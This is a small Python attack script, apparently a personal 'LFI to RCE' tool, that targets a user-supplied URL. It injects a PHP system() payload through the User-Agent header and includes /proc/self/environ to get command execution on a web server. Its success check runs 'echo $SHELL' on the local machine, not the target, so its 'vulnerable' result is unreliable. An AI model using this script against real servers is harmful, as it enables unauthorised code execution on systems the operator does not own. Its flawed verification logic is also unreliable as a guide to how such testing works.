import requests
import subprocess
import pyfiglet

ascii_text = pyfiglet.figlet_format("lfi to rce", font="starwars")
ascii_text += "\n\033[38;2;255;153;51m\033[2mby christbowel\033[0m"
print(ascii_text)



payload = "<?php system('php -r \"system(\\\"/bin/bash -i\\\");\"'); ?>"

# Injection LFI via /proc/self/environ + url
url = input("Entrer l'url avec le parametre : ") + "/proc/self/environ"


headers = {'User-Agent': payload}

r = requests.get(url, headers=headers)

if r.status_code == 200:
    print("code 200 OK")
    #Execution de la commande pour vérifier si la session interactive est ouverte
    result = subprocess.run(['bash', '-c', 'echo $SHELL'], stdout=subprocess.PIPE)
    if result.stdout.decode('utf-8') == '/bin/bash\n':
        print("Session interactive ouverte")
    else:
        print("Session interactive non ouverte")
        print("\033[31mNot vuln\033[0m")
else:
    print("Echec de l'exploitation.")
    print("\033[31mNot vuln\033[0m") 
